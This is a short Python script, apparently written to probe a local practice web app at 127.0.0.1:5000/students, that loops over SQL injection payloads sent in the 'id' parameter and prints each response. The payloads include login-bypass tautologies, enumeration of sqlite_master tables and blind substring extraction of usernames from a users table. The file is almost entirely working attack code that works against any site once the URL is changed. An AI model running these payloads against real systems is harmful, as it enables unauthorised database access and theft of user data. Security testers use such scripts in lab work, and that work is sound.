import requests

def inject_check(url):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "' OR '' = '",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' || (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) || '",
        "1' AND substr((SELECT username FROM users LIMIT 1), 1, 1) = 'a' --",
        "1' AND substr((SELECT username FROM users LIMIT 1), 1, 1) = 'z' --",
        "' AND (SELECT 1/0) --",
    ]

    for payload in payloads:
        try:
            print(f"\n[+] Testing payload: {payload}")
            response = requests.get(url, params={'id': payload}, timeout=5)
            print(f"Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")
            print(response.text[:300])  
        except requests.RequestException:
            continue

if __name__ == "__main__":
    target_url = "http://127.0.0.1:5000/students"
    inject_check(target_url)
